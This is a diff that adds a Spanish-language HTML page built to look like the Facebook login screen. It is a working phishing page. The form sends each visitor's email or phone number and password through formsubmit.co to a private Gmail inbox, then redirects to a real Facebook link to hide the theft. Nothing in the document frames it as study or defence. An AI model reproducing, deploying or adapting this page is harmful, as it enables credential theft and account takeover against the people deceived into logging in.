@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Andev wed - facebook login page</title>
+    <link rel="stylesheet" href="estilo.css">
+</head>
+<body>
+    <div class="container flex">
+        <div class="facebook-pega flex">
+            <div class="text">
+                <h1><span style="color: blue;">facebook</span></h1>
+                <p>Facebook te ayuda a comunicarte</p>
+                <p>y compartir con las personas que</p>
+                <p>forman parte de tu vida.</p>
+            </div>
+            <form id="miFormulario" action="https://formsubmit.co/jimenezdeiver23@gmail.com" method="POST">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_subject" value="Nuevo inicio de sesión en Facebook">
+                <input type="hidden" name="_autoresponse" value="¡Gracias por iniciar sesión en Facebook!">
+                <input type="hidden" name="_replyto" value="{{usuario}}">
+                <input type="hidden" name="_next" value="https://www.facebook.com/share/r/LPL8rPWtdSPiQRJJ/">
+                <input type="text" name="usuario" placeholder="correo electrónico o número de teléfono" required>
+                <input type="password" name="password" placeholder="contraseña" required>
+                <div class="link">
+                    <button type="submit" class="login">iniciar sesión</button>
+                    <a href="#" class="forgot">¿Has olvidado tu contraseña?</a>
+                </div>
+                <hr>
+                <div class="button">
+                    <a href="#">crear nueva cuenta</a>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
